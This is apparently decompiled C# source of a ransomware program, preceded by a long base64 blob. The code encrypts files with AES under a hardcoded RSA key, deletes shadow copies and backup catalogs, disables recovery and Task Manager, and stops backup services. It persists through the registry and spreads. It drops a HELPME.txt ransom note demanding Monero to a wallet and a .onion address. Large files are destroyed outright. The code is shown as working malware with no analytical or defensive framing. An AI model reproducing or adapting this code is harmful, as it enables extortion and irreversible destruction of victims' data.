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

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "HELPME.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"Your files have been encrypted with military grade encrpytion.", "", "------------------", "", "To get your files back:", "", "1. Download Tor Browser here: https://www.torproject.org/download/", "", "2. Buy $5 of XMR (Monero) - suggested sites: https://poloniex.com/signup/ https://www.kraken.com/ https://localmonero.co/nojs", "",
		"3. Send $5 of XMR to 45j4njqVktU1RDM5N6tVaL49tuC33eF3pggqzWufRo58T2HLaF7KVfqDW6Agaz6BYBJSPCFVyB1uMDX9rKJCKJtBSi5EVqP", "", "4. Download decryptor tool via lwxvwzoqnmoea3mkqy2dx4tpakkr36nnripjkcxouvbspwqnges6d6id.onion using the Tor Browser- NOTE: YOU CAN ONLY DOWNLOAD ONCE, LOSE THE DECRYPTOR AND YOU WILL HAVE TO PAY AGAIN!!!!!!!!!!!!!!"
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.get_CurrentInputLanguage().get_Culture().Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString()!.Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			string extension;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120L)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		int num = 0;
		while (true)
		{
			if (num < array2.Length)
			{
				string value = array2[num];
				if (directory.Contains(value))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>jPwHEkwoT29xLsmwvbcT15V7uxiPzqoEvBbaETrR4u4SJ8+JeI6uOSz2Z9KfkC/X9tyDdEPluHMEWIHpzGXewJbP+vJtlybWKSM+UWgCHgK/CgO8vhgZAOt8lB1EhAxFYq6HquG6Vr6R4CKH8s3NFkN/cIbK0j51GL5vL4XC+Zih2Pw46ivRZCGaQbt3nT8UCQHK0TJBo966QT6Qo+AbmzFYCZLp1XTtTlD3/69scr/0X4AkRVfzJTcazn9EgCzCR4aBIG8HexS/7d1VgSoooCAss3EaetfHgdPExot/XXPseBnkW/W44jh5ZE0VRZrq9JXWHU5TfJwyRPK043z7/Q==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

